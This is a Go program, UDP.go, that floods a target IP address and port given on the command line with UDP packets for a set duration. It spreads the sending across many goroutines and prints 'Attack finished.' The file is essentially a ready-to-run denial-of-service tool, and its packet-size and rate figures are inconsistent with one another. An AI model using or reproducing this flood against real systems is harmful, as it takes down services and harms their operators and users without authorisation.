package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>")
		return
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid attack duration:", err)
		return
	}

	// Calculate the number of packets needed to achieve 1GB/s traffic
	packetSize := 2400 // Adjust packet size as needed
	packetsPerSecond := 9_000_000_000 / packetSize
	numThreads := packetsPerSecond / 46_000

	// Create wait group to ensure all goroutines finish before exiting
	var wg sync.WaitGroup
	// Create a channel to signal when to stop the attack
	stop := make(chan struct{})

	// Launch goroutines for each thread
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendUDPPackets(targetIP, targetPort, packetsPerSecond, stop)
		}()
	}

	// Wait for the specified duration and then signal to stop
	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)

	// Wait for all goroutines to finish
	wg.Wait()
	fmt.Println("Attack finished.")
}

func sendUDPPackets(ip, port string, packetsPerSecond int, stop chan struct{}) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	packet := make([]byte, 1400) // Adjust packet size as needed
	batchSize := 500             // Number of packets sent before checking stop

	for {
		select {
		case <-stop:
			// Exit when receiving stop signal
			return
		default:
			// Send packets in batches
			for i := 0; i < packetsPerSecond/batchSize; i++ {
				for j := 0; j < batchSize; j++ {
					_, err := conn.Write(packet)
					if err != nil {
						fmt.Println("Error sending UDP packet:", err)
						return
					}
				}

				// After sending a batch, check for the stop signal
				select {
				case <-stop:
					return
				default:
					// Continue to next batch if no stop signal
				}
			}
		}
	}
}